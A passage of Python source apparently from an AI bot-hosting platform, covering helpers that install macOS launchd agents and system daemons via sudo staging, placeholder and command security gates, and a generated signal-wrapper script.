                return _err(f"could not create {la_dir}: {r.stderr.strip()[:200]}")
            subprocess.run(
                ["sudo", "/usr/sbin/chown", f"{bot_user}:staff", str(la_dir)],
                capture_output=True, timeout=5,
            )

        # Copy + chown + chmod 644 (world-readable; launchd needs to read
        # as the bot user, root for bootstrap).
        r = subprocess.run(
            ["sudo", "/bin/cp", tmp_path, str(plist_dest)],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode != 0:
            return _err(
                f"could not write {plist_dest}: {r.stderr.strip()[:200]}"
            )
        subprocess.run(
            ["sudo", "/usr/sbin/chown", f"{bot_user}:staff", str(plist_dest)],
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "/bin/chmod", "644", str(plist_dest)],
            capture_output=True, timeout=5,
        )
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass

    loaded = False
    if bootstrap:
        # Idempotent reload: bootout (ignore-failure) then bootstrap. The
        # target domain is the bot's GUI launchd domain (gui/{uid}). On a
        # fresh boot when the bot user has never logged in, this can fail —
        # the plist still lands on disk and will pick up on next login.
        # raw(): the system-domain Scheduler adapter doesn't model
        # per-user gui domains — don't force-fit install()/remove() here.
        domain = f"gui/{bot_uid}"
        sched = get_launchd_scheduler()
        sched.raw("bootout", f"{domain}/{label}")
        b_rc, _b_out, b_err = sched.raw("bootstrap", domain, str(plist_dest))
        if b_rc == 0:
            loaded = True
        else:
            logger.warning(
                "forge install: bootstrap %s/%s failed (plist written): %s",
                domain, label, b_err.strip()[:200],
            )

    return _ok(str(plist_dest), loaded=loaded)


def _bot_uid(bot_user: str) -> int | None:
    """Resolve a macOS UID for ``bot_user``. Returns None on any failure."""
    try:
        import pwd
        return pwd.getpwnam(bot_user).pw_uid
    except (KeyError, ImportError):
        return None


# ── launchd system-domain install — for service-only bot users ──────────────
#
# Bot users in an Evolve pod are typically service accounts: created by
# ``evolve-admin add-bot``, never logged in via the GUI, no Aqua session.
# That means the user-level launchd domain (``gui/<uid>``) doesn't exist,
# and ``install_launch_agent`` bootstrap fails with::
#
#     Bootstrap failed: 125: Domain does not support specified action
#
# The robust path — the same one the pod's gateway plists already use —
# is to install at ``/Library/LaunchDaemons/<label>.plist`` (root-owned),
# include a ``UserName`` key in the plist so the daemon runs as the bot
# user, and bootstrap into the ``system`` domain. System domain is always
# available, regardless of whether the bot user has ever logged in.
#
# ``install_launch_agent`` (above) is retained for the rare case where the
# bot lives on a real interactive macOS account (e.g. the operator's own
# laptop login) — there the user-domain LaunchAgent is correct because
# launchd respects the user's preferred-application chain.


def install_launchd_system_daemon(
    bot_id: str,
    label: str,
    plist_xml: str,
    *,
    network: dict | None = None,
    bootstrap: bool = True,
) -> dict:
    """Install a system-domain LaunchDaemon at ``/Library/LaunchDaemons/``.

    Companion to ``install_launch_agent``; use this one for bot users
    that don't have a GUI session (the common case on a pod). The
    supplied ``plist_xml`` must include a ``UserName`` key (set the bot
    user in your builder) — otherwise the daemon runs as root, which is
    almost never what you want.

    Idempotent: any prior ``system/<label>`` load is bootout'd before the
    new one is bootstrapped. Bootout of a non-existent label is silently
    tolerated.

    Returns the same envelope as ``install_launch_agent``:
      ``{ok, artifact, error, loaded}``.
    """
    if not bot_id or not label or not plist_xml:
        return _err("install_launchd_system_daemon requires bot_id, label, plist_xml")
    if "/" in label or label.endswith(".plist"):
        return _err(
            f"invalid label {label!r}: must not contain '/' or '.plist' suffix"
        )

    # bot_id and the user lookup aren't strictly required by launchd
    # (UserName lives in the plist XML), but resolving them lets us surface
    # config errors here rather than at runtime when the daemon mysteriously
    # fails to launch.
    net = network or load_network()
    try:
        bot_user = get_bot_user(bot_id, net)
    except Exception as exc:
        return _err(f"could not resolve bot user: {exc}")
    if _bot_uid(bot_user) is None:
        return _err(f"could not resolve UID for bot user {bot_user!r}")

    ld_dir = Path("/Library/LaunchDaemons")
    plist_dest = ld_dir / f"{label}.plist"

    # Stage to /tmp owned by evolve, then sudo cp into place. Per
    # CLAUDE.md §"Writes — /tmp staging + sudo /bin/cp".
    fd, tmp_path = tempfile.mkstemp(
        dir="/tmp", prefix=f"evolve-forge-{bot_id}-", suffix=".plist",
    )
    try:
        with os.fdopen(fd, "w") as f:
            f.write(plist_xml)

        # Copy into place. /Library/LaunchDaemons/ already exists on every
        # macOS install — no mkdir needed.
        r = subprocess.run(
            ["sudo", "/bin/cp", tmp_path, str(plist_dest)],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode != 0:
            return _err(
                f"could not write {plist_dest}: {r.stderr.strip()[:200]}"
            )
        # System LaunchDaemons MUST be root-owned; launchctl bootstrap
        # rejects non-root-owned plists at this path with "Path had bad
        # ownership/permissions".
        subprocess.run(
            ["sudo", "/usr/sbin/chown", "root:wheel", str(plist_dest)],
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "/bin/chmod", "644", str(plist_dest)],
            capture_output=True, timeout=5,
        )
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass

    loaded = False
    if bootstrap:
        # Idempotent reload: bootout (ignore failure — common when the
        # label was never loaded) then bootstrap. The system domain is
        # always available, so unlike the gui/{uid} path, this can't be
        # blocked by a missing session.
        # raw() rather than Scheduler.install(): the plist was staged
        # above from caller-supplied XML with this function's own error
        # envelope; install() renders from a JobSpec and would skip the
        # reload when on-disk content is byte-identical, breaking the
        # idempotent always-reload contract documented in the docstring.
        sched = get_launchd_scheduler()
        sched.raw("bootout", f"system/{label}")
        b_rc, _b_out, b_err = sched.raw("bootstrap", "system", str(plist_dest))
        if b_rc == 0:
            loaded = True
        else:
            logger.warning(
                "forge install: bootstrap system/%s failed (plist written): %s",
                label, b_err.strip()[:200],
            )

    return _ok(str(plist_dest), loaded=loaded)


# ── launchd command-mechanism install — Atlas/EA/Morning-style daemons ───────
#
# The ``mechanism: "launchd"`` scheduled-action shape used by every cron-driven
# gallery app (EA Pack, Atlas Daily Digest, Morning Briefing, Email Triage,
# Calendar Daily Summary, Note-taker, Workspace Backup, Email Integration,
# Calendar Sync, GitHub Integration). Each manifest declares::
#
#     {
#       "id": "<action_id>",
#       "mechanism": "launchd",
#       "install": {
#         "plist_label": "com.${bot_id}.<app>",
#         "command":     "/bin/bash scripts/<app>-cron.sh",
#         "cwd":         "${workspace}",
#         "schedule":    {"cron": {"Hour": 9, "Minute": 0}},
#         "env":         {"TZ": "America/Los_Angeles"}   # optional
#       }
#     }
#
# We expand ``${bot_id}`` and ``${workspace}`` to the bot's actual values,
# split ``command`` into ProgramArguments, render the plist via
# ``_build_command_plist_xml``, and hand off to ``install_launch_agent``
# for the staging + bootstrap pass.
#
# This is the migration target for the 2026-06-04 Atlas Daily Digest
# incident — see ``scheduled_actions_validator`` for the input-side gate
# that catches manifests still missing the structured declaration.


def _substitute_install_vars(s: str, *, bot_id: str, workspace: str) -> str:
    """Expand ``${bot_id}`` and ``${workspace}`` in a manifest-supplied string.

    Manifests can't know the target bot's identity at authoring time, so
    we use ``${name}`` placeholders that the materializer resolves. Only
    the two well-known variables are substituted; other ``${...}`` sequences
    pass through untouched so they survive into the plist (e.g. a real
    shell substitution inside a command).
    """
    if not isinstance(s, str):
        return s
    return s.replace("${bot_id}", bot_id).replace("${workspace}", workspace)


def _split_command(command: str) -> list[str]:
    """Parse a manifest-supplied command string into ProgramArguments.

    Uses ``shlex.split`` so quoted arguments survive, then enforces that
    the first token is an absolute path (launchd does NOT resolve relative
    program names against PATH — the job silently fails to load).
    """
    import shlex
    parts = shlex.split(command)
    if not parts:
        raise ValueError("command parses to empty argv")
    if not parts[0].startswith("/"):
        raise ValueError(
            f"command must start with an absolute path, got {parts[0]!r}. "
            f"launchd does not resolve relative program names against PATH."
        )
    return parts


def _check_resolved_command_and_helper(command_sub: str, workspace: str) -> str:
    """Refuse to install a launchd command whose helper script is still a
    template (Atlas Daily Digest incident, 2026-06-16).

    forge substitutes the plist *command* (``${bot_id}`` / ``${workspace}``)
    but NOT the helper-script *body* the command points at — a wrapper
    shipped with literal ``{bot_id}`` / ``{telegram_chat_id}`` placeholders
    runs and fails every morning while its ``exit 0`` reports success.

    Returns "" when the command + its referenced helper script are fully
    resolved; otherwise a human-readable error describing the residual
    placeholders, so the caller fails the install loudly instead of
    bootstrapping a broken job.
    """
    # 1) The substituted command itself must not carry an unresolved
    #    install variable (``_substitute_install_vars`` only resolves
    #    bot_id / workspace — a command using ${shared_dir} etc. relies on
    #    substitution that never happens).
    residual_cmd = scan_residual_placeholders(command_sub, shell_script=True)
    if residual_cmd:
        return (
            f"install command still contains unresolved placeholders "
            f"{residual_cmd} after substitution: {command_sub!r}"
        )

    # 2) The helper script the command executes must be fully resolved.
    script_path, is_shell = helper_script_from_command(
        command_sub, workspace_root=workspace,
    )
    if script_path is None:
        return ""  # no in-workspace helper body to lint (e.g. a bare binary)

    # A missing helper body is not a block — install ordering may write the
    # script after this action, or it may live elsewhere. Only lint a file
    # that actually exists on disk.
    try:
        if not script_path.is_file():
            return ""
        body = script_path.read_text(encoding="utf-8")
    except PermissionError:
        # File exists but ACL not yet propagated for a freshly-deployed bot
        # — fall back to sudo -n /bin/cat (same pattern as the config
        # readers + delivery_monitor's probe). ``-n`` + a timeout so a
        # context without the NOPASSWD grant fails fast instead of blocking
        # the install on a password prompt.
        try:
            r = subprocess.run(
                ["sudo", "-n", "/bin/cat", str(script_path)],
                capture_output=True, text=True, timeout=5,
            )
        except (subprocess.TimeoutExpired, OSError):
            return ""
        if r.returncode != 0:
            return ""
        body = r.stdout
    except OSError:
        return ""

    residual = scan_residual_placeholders(body, shell_script=is_shell)
    if residual:
        return (
            f"helper script {script_path} still contains unsubstituted "
            f"template placeholders {residual} — refusing to install a "
            f"launchd job that would fail on every run. Resolve the "
            f"placeholders (or escape a literal brace as {{{{name}}}}) and retry."
        )
    return ""


def _ensure_launchd_openclaw_path(env: dict | None) -> dict:
    """Return ``env`` with a PATH that can find openclaw/node. Any app-supplied
    PATH entries are kept (and take precedence); the platform's exec dirs are
    appended where missing so a bare ``openclaw`` call resolves under launchd's
    minimal default environment.

    The dirs come from ``platform_profile.exec_path_dirs`` — the SAME source the
    infra gateway daemon uses (``setup_wizard._evolve_gateway_jobspec``), so the
    app-cron PATH tracks the platform profile (Homebrew prefixes on macOS, FHS
    on Linux) instead of a parallel hardcoded tuple that would diverge on a
    Linux pod (W10-F single-source contract)."""
    from platform_profile import get_profile

    out = dict(env or {})
    parts = [p for p in str(out.get("PATH", "")).split(":") if p]
    for d in get_profile().exec_path_dirs:
        if d not in parts:
            parts.append(d)
    out["PATH"] = ":".join(parts)
    return out


def install_launchd_command_action(
    bot_id: str,
    action_id: str,
    label: str,
    command: str,
    schedule: dict,
    *,
    cwd: str = "",
    env: dict | None = None,
    network: dict | None = None,
    bootstrap: bool = True,
) -> dict:
    """Install a ``mechanism: "launchd"`` scheduled action.

    Builds a system-domain LaunchDaemon plist from the structured shape
    and writes it via ``install_launchd_system_daemon`` (root-owned plist
    at ``/Library/LaunchDaemons/<label>.plist``, UserName=<bot_user>,
    bootstrapped into ``system``). This is the materializer for the
    canonical Atlas/EA Pack manifest shape, post-2026-06-04 migration.

    Substitutions applied to ``label``, ``command``, ``cwd``, and env
    values before rendering:
      ``${bot_id}``    → ``bot_id`` argument
      ``${workspace}`` → ``/Users/<bot_user>/.openclaw/workspace``

    **Label convention.** ``plist_label`` must resolve (post-substitution)
    to ``ai.evolve.<bot_id>.<app_slug>``. This is enforced by the gallery
    regression test (``test_every_gallery_launchd_label_lives_under_ai_evolve_namespace``)
    because the evolve user's sudoers grants scope cp / chown / chmod /
    launchctl bootstrap+bootout / rm to the ``ai.evolve.*`` namespace.
    A label in a different namespace passes unit tests but blocks at
    sudo /bin/cp on a real pod ("a terminal is required to read the
    password"). If a new use case needs a different namespace, extend
    the grants in setup_wizard._render_evolve_sudoers in the same PR.

    Argument validation (each raises ValueError surfaced as the dict envelope's
    ``error`` field via the outer try/except in the forge dispatcher):
      - ``label`` non-empty and free of '/' / '.plist' (same rule as
        ``install_launch_agent``).
      - ``command`` parses non-empty and begins with an absolute path.
      - ``schedule`` matches one of ``_schedule_fields``'s shapes.

    Returns the same envelope as ``install_launchd_system_daemon``:
      ``{ok, artifact, error, loaded}``.
    """
    if not bot_id or not action_id or not label or not command:
        return _err(
            "install_launchd_command_action requires bot_id, action_id, "
            "label, command"
        )
    if not isinstance(schedule, dict) or not schedule:
        return _err(
            "install_launchd_command_action requires a schedule dict "
            "(every_minutes=N OR cron={...})"
        )

    net = network or load_network()
    try:
        bot_user = get_bot_user(bot_id, net)
    except Exception as exc:
        return _err(f"could not resolve bot user: {exc}")

    workspace = f"/Users/{bot_user}/.openclaw/workspace"

    # Apply ${bot_id} / ${workspace} substitutions across all manifest-supplied
    # strings BEFORE further validation. The substituted forms are what
    # land in the plist.
    label_sub   = _substitute_install_vars(label,   bot_id=bot_id, workspace=workspace)
    command_sub = _substitute_install_vars(command, bot_id=bot_id, workspace=workspace)
    cwd_sub     = _substitute_install_vars(cwd,     bot_id=bot_id, workspace=workspace) if cwd else ""

    env_sub: dict | None = None
    if env:
        if not isinstance(env, dict):
            return _err("env must be a dict[str, str] or None")
        env_sub = {
            str(k): _substitute_install_vars(str(v), bot_id=bot_id, workspace=workspace)
            for k, v in env.items()
        }

    # launchd hands a job a minimal PATH (/usr/bin:/bin:/usr/sbin:/sbin) that
    # EXCLUDES /opt/homebrew/bin — where `openclaw` and `node` live on Apple
    # Silicon. An app cron that shells out to openclaw (e.g. Atlas Daily Digest's
    # classifier, Ledger's morning-briefing / note-taker) therefore dies with
    # exit 127 (command not found) and, masked by an exit-0-on-empty wrapper,
    # silently delivers nothing (atlas: 2 weeks of empty digests, 2026-06-22).
    # Infra daemons already set this PATH; app crons did not. Always inject it so
    # every app cron can find openclaw/node, merging with any app-supplied PATH.
    env_sub = _ensure_launchd_openclaw_path(env_sub)

    # Same defense-in-depth label rule as install_launch_agent, applied
    # AFTER substitution (a label that uses ${bot_id} would otherwise
    # always trip the bare-name check).
    if "/" in label_sub or label_sub.endswith(".plist"):
        return _err(
            f"invalid label {label_sub!r}: must not contain '/' or '.plist' suffix"
        )

    # Pre-exec gate (security review 2026-06-09; argv allowlist 2026-06-10,
    # roadmap 2.9): denylist + shell-feature refusal + first-token
    # allowlist. Check AFTER substitution so patterns like
    # /Users/<real-user>/... (post ${bot_id} expansion) are evaluated
    # against the real values.
    _gated_argv, _gate_reason = gate_exec_command(command_sub, workspace=workspace)
    if _gated_argv is None:
        return _err(
            f"install command refused by security gate: {_gate_reason}"
        )

    try:
        program_arguments = _split_command(command_sub)
    except ValueError as exc:
        return _err(f"command parse failed: {exc}")

    # Template-honesty gate (Atlas Daily Digest incident, 2026-06-16):
    # never bootstrap a launchd job whose command or helper script still
    # carries unsubstituted ``{var}`` / ``${var}`` placeholders.
    helper_err = _check_resolved_command_and_helper(command_sub, workspace)
    if helper_err:
        return _err(helper_err)

    # Log paths follow the same shape forge already uses for launchd_python_signal:
    # /tmp/<label>.{out,err}.log. tmpfs survives reboots (macOS), so this
    # is the right place for ephemeral cron output.
    log_path     = f"/tmp/{label_sub}.out.log"
    err_log_path = f"/tmp/{label_sub}.err.log"

    try:
        plist_xml = _build_command_plist_xml(
            label             = label_sub,
            program_arguments = program_arguments,
            schedule          = schedule,
            log_path          = log_path,
            err_log_path      = err_log_path,
            cwd               = cwd_sub,
            env               = env_sub,
            # Bot users on a pod are service accounts (created by add-bot,
            # never log in via GUI). install_launchd_system_daemon → system
            # domain only works when the plist self-declares the user it
            # should run as; without UserName the daemon runs as root.
            user_name         = bot_user,
            group_name        = "staff",
        )
    except ValueError as exc:
        return _err(f"plist render failed: {exc}")

    return install_launchd_system_daemon(
        bot_id, label_sub, plist_xml,
        network=net, bootstrap=bootstrap,
    )


def repair_app_cron_env_paths(
    members: list,
    *,
    shared_dir: "str | Path | None" = None,
    network: dict | None = None,
    check_only: bool = False,
    bootstrap: bool = True,
) -> dict:
    """Self-heal: ensure every installed launchd app-cron plist has a PATH that
    can find openclaw/node.

    App crons installed before ``_ensure_launchd_openclaw_path`` landed carry no
    ``EnvironmentVariables``, so a bare ``openclaw`` call dies exit 127 under
    launchd's minimal default PATH — silently delivering nothing (atlas
    daily-digest + ledger morning-briefing/note-taker, 2026-06-22). For each
    manifest ``launchd`` scheduled_action whose INSTALLED plist lacks a ``PATH``,
    re-install it via the now-fixed command installer. Idempotent: once a plist
    has a PATH it is skipped, so this is a one-time heal then a no-op.

    Returns ``{"checked", "missing": [labels], "healed": [labels],
    "failed": [{label, error}]}``. ``check_only=True`` reports ``missing`` without
    installing.
    """
    from .manifest import list_manifests

    net = network or load_network()
    shared_path = Path(shared_dir) if shared_dir is not None else DEFAULT_SHARED_DIR
    report: dict = {"checked": 0, "missing": [], "healed": [], "failed": []}
    for bot_id in (members or []):
        # bot_home resolves bot_id → OS account → home dir (pwd-first), so the
        # ${workspace} substitution below matches what the installer renders.
        try:
            workspace = str(bot_home(bot_id, net) / ".openclaw" / "workspace")
        except (KeyError, OSError, ValueError) as exc:
            logger.warning("repair_app_cron_env_paths: skipping %s — cannot resolve "
                           "bot home: %s", bot_id, exc)
            continue
        try:
            manifests = list_manifests(shared_path, bot_id)
        except (OSError, ValueError) as exc:
            logger.warning("repair_app_cron_env_paths: skipping %s — cannot list "
                           "manifests under %s: %s", bot_id, shared_path, exc)
            continue
        for manifest in manifests:
            for action in (getattr(manifest, "scheduled_actions", None) or []):
                if not isinstance(action, dict) or action.get("mechanism") != "launchd":
                    continue
                install_cfg = action.get("install") or {}
                command = str(install_cfg.get("command") or "").strip()
                schedule = install_cfg.get("schedule") or {}
                label = str(install_cfg.get("plist_label") or "").strip()
                if not command or not isinstance(schedule, dict) or not schedule or not label:
                    continue  # not a structured command action we can re-install
                label_sub = _substitute_install_vars(label, bot_id=bot_id, workspace=workspace)
                artifact = action.get("installed_artifact") or ""
                if isinstance(artifact, str) and artifact.endswith(".plist"):
                    plist_path = Path(artifact)
                else:
                    plist_path = Path("/Library/LaunchDaemons") / f"{label_sub}.plist"
                if not plist_path.exists():
                    continue  # never materialized — nothing to heal
                report["checked"] += 1
                try:
                    text = plist_path.read_text()
                except OSError as exc:
                    logger.warning("repair_app_cron_env_paths: cannot read installed "
                                   "plist %s: %s", plist_path, exc)
                    continue
                if "<key>PATH</key>" in text:
                    continue  # already has a PATH
                report["missing"].append(label_sub)
                if check_only:
                    continue
                result = install_launchd_command_action(
                    bot_id, str(action.get("id") or ""), label, command, schedule,
                    cwd=str(install_cfg.get("cwd") or "").strip(),
                    env=install_cfg.get("env") or None,
                    network=net, bootstrap=bootstrap,
                )
                if result.get("ok"):
                    report["healed"].append(label_sub)
                else:
                    report["failed"].append({"label": label_sub, "error": result.get("error")})
    return report


# ── launchd_python_signal — v18 Python-by-default scheduled action ───────────
#
# Spec: docs/spec-launchd-python-signal-2026-06-03.md.
#
# The Python wrapper runs on the launchd schedule, executes the bot's
# command, scans stdout for the declared signal patterns, and writes a
# Signal to the Signal store ONLY when at least one pattern matches.
# Most invocations are silent: zero LLM cost. The signal-subscriber
# daemon (already running) routes any Signals that DO land to the bot's
# LLM via the `signal_to_bot_nudge` generator (T-A.3, follow-on PR).


# The wrapper script template. Frozen identifiers via str.format so we
# don't have to thread escaping through a build_spec round-trip.
# Triple-braced `{{` / `}}` are literal braces in the output Python.
_WRAPPER_TEMPLATE = '''\
#!/usr/bin/env python3
# evolve-managed: launchd_python_signal wrapper for {label}
# pkg={pkg_id} job={job_id}
#
# Spec: docs/spec-launchd-python-signal-2026-06-03.md.
# Generated by evolve_admin.applications.install_helpers; do not edit by hand.

import json
import os
import subprocess
import sys
from pathlib import Path

# Config — frozen at install time
# COMMAND is display-only (Signal details); COMMAND_ARGV is what executes.
COMMAND = {command_repr}
COMMAND_ARGV = {command_argv_repr}
CWD = {cwd_repr}
PATTERNS = {patterns_repr}
SIGNAL_TYPE = {signal_type_repr}
SIGNAL_SEVERITY = {signal_severity_repr}
BOT_ID = {bot_id_repr}
APP_ID = {app_id_repr}
SHARED_DIR = Path({shared_dir_repr})
LABEL = {label_repr}


def _run_command():
    """Return (stdout, exit_code) or (None, None) on timeout.

    Executes the argv vector with shell=False (roadmap 2.9): the command
    was validated against the interpreter allowlist at install time, and
    without a shell there is no metacharacter surface left to inject.
    """
    try:
        proc = subprocess.run(
            COMMAND_ARGV, shell=False, cwd=CWD,
            capture_output=True, text=True, timeout=300,
        )
        return proc.stdout, proc.returncode
    except subprocess.TimeoutExpired:
        return None, None


def _matched_lines(stdout):
    """Find lines in stdout containing any of the declared patterns."""
    if not stdout:
        return []
    return [
        line.strip()
        for line in stdout.splitlines()
        if any(pat in line for pat in PATTERNS)
    ]


def _write_signal(matched):
    """Best-effort write to the Signal store. Silent on import failure."""
    try:
        from signals import store as signal_store
    except ImportError as exc:
        # Analyzer package not available — log to stderr (launchd captures
        # this; operators see it in /var/log/system.log or the bot's
        # StandardErrorPath). Exit 1 so the failure is observable.
        print(
            "launchd_python_signal: signal store unavailable: {{exc}}".format(exc=exc),
            file=sys.stderr,
        )
        return 1

    try:
        signal_store.observe(
            bot_id=BOT_ID,
            type=SIGNAL_TYPE,
            severity=SIGNAL_SEVERITY,
            summary=(
                "{{n}} item(s) from {{label}}"
                .format(n=len(matched), label=LABEL)
            ),
            details={{
                "matched_lines": matched[:50],
                "command": COMMAND,
                "app_id": APP_ID,
            }},
            source="launchd:" + LABEL,
            shared_dir=SHARED_DIR,
        )
        return 0
    except Exception as exc:
        print(
            "launchd_python_signal: signal_store.observe failed: {{exc}}"
            .format(exc=exc),
            file=sys.stderr,
        )
        return 1


def main():
    stdout, _rc = _run_command()
    matched = _matched_lines(stdout)
    if not matched:
        # The happy path — no LLM ever involved.
        return 0
    return _write_signal(matched)


if __name__ == "__main__":
    sys.exit(main())
'''


def _schedule_fields(schedule: dict) -> tuple[int | None, dict | None]:
    """Map the manifest schedule shape onto JobSpec scheduling fields.

    Schedule shape (either-or):
      schedule = {"every_minutes": int}
        → ``(start_interval_seconds, None)``
      schedule = {"cron": {"Hour": 0, "Minute": 30, ...}}
        → ``(None, start_calendar_dict)``
    """
    if "every_minutes" in schedule:
        every = int(schedule["every_minutes"])
        if every < 1:
            raise ValueError("schedule.every_minutes must be >= 1")
        return every * 60, None
    if "cron" in schedule:
        cron = schedule["cron"]
        if not isinstance(cron, dict) or not cron:
            raise ValueError(
                "schedule.cron must be a non-empty dict with launchd "
                "StartCalendarInterval keys (Hour, Minute, ...)"
            )
        return None, {str(k): int(v) for k, v in cron.items()}
    raise ValueError(
        "schedule must declare either every_minutes or cron"
    )


def _build_plist_xml(
    *, label: str, wrapper_path: str, schedule: dict,
    log_path: str, err_log_path: str,
    user_name: str = "",
    group_name: str = "",
) -> str:
    """Render a launchd plist for the launchd_python_signal wrapper.

    Schema (legacy entry point for install_python_signal_action):
      - Program is hard-coded to ``<venv python3> <wrapper_path>`` — the
        wrapper imports ``signals`` from the evolve-analyzer package, which
        is installed in the shared venv (system python3 doesn't have it).
      - No env, no cwd (the wrapper handles those internally).
      - Schedule dispatched via ``_schedule_fields``.
      - Optional ``user_name`` / ``group_name`` for system-domain installs.

    New launchd-mechanism action callers should use ``_build_command_plist_xml``
    instead — it parameterizes ProgramArguments / env / cwd.
    """
    start_interval, start_calendar = _schedule_fields(schedule)
    spec = JobSpec(
        label=label,
        program_args=[VENV_PYTHON, wrapper_path],
        # System-domain LaunchDaemons need UserName/GroupName to run as the
        # bot user (root is the default and almost never what we want).
        # User-domain LaunchAgents inherit the session user → leave unset.
        user=user_name or None,
        group_name=(group_name or "staff") if user_name else None,
        start_interval=start_interval,
        start_calendar=start_calendar,
        stdout_path=log_path,
        stderr_path=err_log_path,
        run_at_load=False,
    )
    return render_launchd_plist(spec)


def _build_command_plist_xml(
    *,
    label: str,
    program_arguments: list,
    schedule: dict,
    log_path: str,
    err_log_path: str,
    cwd: str = "",
    env: dict | None = None,
    user_name: str = "",
    group_name: str = "",
) -> str:
    """Render a LaunchAgent plist for a launchd-mechanism scheduled action.

    Unlike ``_build_plist_xml`` (which hardcodes a python3 wrapper), this
    accepts the full ``ProgramArguments`` array verbatim, plus optional
    ``cwd`` and ``env`` blocks. Used by ``install_launchd_command_action``
    to materialize ``mechanism: "launchd"`` entries from their structured
    ``install.{command, schedule, cwd, env}`` shape.

    Arguments:
      label              — launchd Label string (reverse-DNS).
      program_arguments  — non-empty list of strings for ProgramArguments.
                           The first element should be an absolute path
                           (e.g. ``/bin/bash``); launchd does NOT resolve
                           relative entries against PATH.
      schedule           — dict in ``_schedule_fields`` shape.
      log_path           — StandardOutPath value.
      err_log_path       — StandardErrorPath value.
      cwd                — WorkingDirectory value, or empty to omit.
      env                — EnvironmentVariables dict, or None to omit.

    Raises ``ValueError`` on empty/invalid ``program_arguments`` or schedule.
    Returns a fully-rendered plist XML string ready to hand to
    ``install_launch_agent``.
    """
    if not isinstance(program_arguments, list) or not program_arguments:
        raise ValueError("program_arguments must be a non-empty list of strings")
    for arg in program_arguments:
        if not isinstance(arg, str):
            raise ValueError(
                f"program_arguments entries must be strings, got {type(arg).__name__}"
            )
    if env and not isinstance(env, dict):
        raise ValueError("env must be a dict[str, str] or None")

    start_interval, start_calendar = _schedule_fields(schedule)
    spec = JobSpec(
        label=label,
        program_args=list(program_arguments),
        user=user_name or None,
        group_name=(group_name or "staff") if user_name else None,
        working_dir=cwd or None,
        env=dict(env) if env else None,
        start_interval=start_interval,
        start_calendar=start_calendar,
        stdout_path=log_path,
        stderr_path=err_log_path,
        run_at_load=False,
    )
    return render_launchd_plist(spec)


def install_python_signal_action(
    bot_id: str,
    action_id: str,
    label: str,
    command: str,
    schedule: dict,
    signal_patterns: list,
    *,
    cwd: str = "",
    signal_type: str = "task_pending",
    signal_severity: str = "info",
    app_id: str = "",
    pkg_id: str = "",
    job_id: str = "",
    shared_dir: str = "/Users/Shared/evolve",
    network: dict | None = None,
    bootstrap: bool = True,
) -> dict:
    """Install a launchd_python_signal scheduled action.

    Writes:
      1. A wrapper Python script to ``{workspace}/evolve/scheduled/{action_id}.py``
      2. A LaunchAgent plist to ``~/Library/LaunchAgents/{label}.plist``

    The wrapper runs ``command`` on the launchd schedule and writes a
    Signal to ``{shared_dir}/signals/firing/`` only when stdout
    contains a line matching one of ``signal_patterns``. Most
    invocations are silent — no LLM session.

    Args:
        bot_id, action_id: scheduling identity (matches the manifest's
            scheduled_actions[].id).
        label: LaunchAgent reverse-DNS label. Must match
            ``com.{bot_id}.{rest}`` per project convention.
        command: shell command for the wrapper to run.
        schedule: ``{"every_minutes": N}`` OR ``{"cron": {...}}`` —
            see ``_build_plist_xml``.
        signal_patterns: list of substring matches in stdout that
            trigger a Signal write.
        cwd: working directory for the command. Defaults to the bot's
            workspace root if blank.
        signal_type / signal_severity: passed to
            ``signals.store.observe()``. Spec §3 documents the
            convention.
        app_id, pkg_id, job_id: stamped on the wrapper for traceability.
        shared_dir: path to ``/Users/Shared/evolve``; the wrapper writes
            Signals here.
        bootstrap: re-loads launchd on install (default True). Tests
            pass False to skip the launchctl call.

    Returns:
        {ok, artifact, error, wrapper_path, plist_path, loaded}

        ``artifact`` is the form ``"{plist_path}+{wrapper_path}"`` so
        downstream consumers can split if they need both. Same
        envelope shape as the other helpers in this module.
    """
    if not bot_id or not action_id or not label or not command:
        return _err(
            "install_python_signal_action requires bot_id, action_id, "
            "label, command"
        )
    if not isinstance(signal_patterns, list) or not signal_patterns:
        return _err(
            "install_python_signal_action requires a non-empty "
            "signal_patterns list"
        )
    if not isinstance(schedule, dict) or not schedule:
        return _err(
            "install_python_signal_action requires a schedule dict "
            "(every_minutes=N OR cron={...})"
        )
    if "/" in label or label.endswith(".plist"):
        return _err(
            f"invalid label {label!r}: must not contain '/' or '.plist' suffix"
        )

    net = network or load_network()
    try:
        bot_user = get_bot_user(bot_id, net)
    except Exception as exc:
        return _err(f"could not resolve bot user: {exc}")

    workspace = Path(f"/Users/{bot_user}/.openclaw/workspace")

    # Apply ${bot_id}/${workspace} substitution (same contract as the
    # launchd mechanism — previously these markers reached the shell
    # unexpanded here and silently expanded to empty).
    command_sub = _substitute_install_vars(
        command, bot_id=bot_id, workspace=str(workspace),
    )

    # Pre-exec gate (security review 2026-06-09; argv allowlist 2026-06-10,
    # roadmap 2.9). The parsed vector — not the string — is frozen into
    # the wrapper and executed with shell=False, so shell metacharacters
    # are inert; the gate refuses anything that *wanted* shell semantics.
    # Refuse before writing anything to disk.
    command_argv, _gate_reason = gate_exec_command(
        command_sub, workspace=str(workspace),
    )
    if command_argv is None:
        return _err(
            f"install command refused by security gate: {_gate_reason}"
        )
    scheduled_dir = workspace / "evolve" / "scheduled"
    log_dir = scheduled_dir / "logs"
    wrapper_path = scheduled_dir / f"{action_id}.py"
    log_path = log_dir / f"{action_id}.log"
    err_log_path = log_dir / f"{action_id}.err.log"

    if not cwd:
        cwd = str(workspace)

    # Render the wrapper. Identifiers go through repr() so any
    # quote/backslash content in the source command is preserved
    # without further escaping. The wrapper imports ``signals`` from
    # the installed evolve-analyzer package.
    wrapper_body = _WRAPPER_TEMPLATE.format(
        label=label,
        pkg_id=pkg_id or "(unset)",
        job_id=job_id or "(unset)",
        command_repr=repr(command_sub),
        command_argv_repr=repr(command_argv),
        cwd_repr=repr(cwd),
        patterns_repr=repr(list(signal_patterns)),
        signal_type_repr=repr(signal_type),
        signal_severity_repr=repr(signal_severity),
        bot_id_repr=repr(bot_id),
        app_id_repr=repr(app_id or ""),
        shared_dir_repr=repr(shared_dir),
        label_repr=repr(label),
    )

    # Write the wrapper. ``evolve`` has write ACL on the bot's
    # workspace, so a direct write is fine. Atomic via tempfile +
    # os.replace.
